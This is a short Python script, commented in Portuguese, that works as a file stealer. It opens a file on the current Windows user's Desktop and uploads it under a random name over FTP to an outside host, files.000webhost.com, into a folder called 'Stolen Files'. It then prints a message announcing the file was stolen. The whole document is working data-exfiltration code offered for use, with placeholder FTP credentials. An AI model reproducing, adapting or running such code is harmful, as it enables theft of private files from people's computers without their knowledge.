#Developed -> Dock0d1
import os
import math
import random	
import string
import ftplib
import time

def id_generator(size=25,chars=string.ascii_uppercase + string.digits + string.ascii_lowercase):
	return ''.join(random.choice(chars) for _ in range(size))

user = os.getlogin() #Usuario
filelocation = "C:/Users/" + user + "/Desktop/ExampleFile.txt" #Arquivo
FTPservername = "nomequalquer"
FTPserverpass = "senhaqualquer"
FTPserverhost = "files.000webhost.com"
filerandomname = id_generator()
#FTP
FTP = ftplib.FTP(FTPserverhost,FTPservername,FTPserverpass) #Faz a conexão
file = open(filelocation,"rb") #Abra o arquivo com o sinalizador rb. (read binary)
FTP.storbinary("STOR /Stolen Files/" + filerandomname,file) #Armazena um binário (o arquivo)
FTP.quit() #Desconecta-se do servidor.

print("Arquivo roubado com sucesso!!")
time.sleep(5)
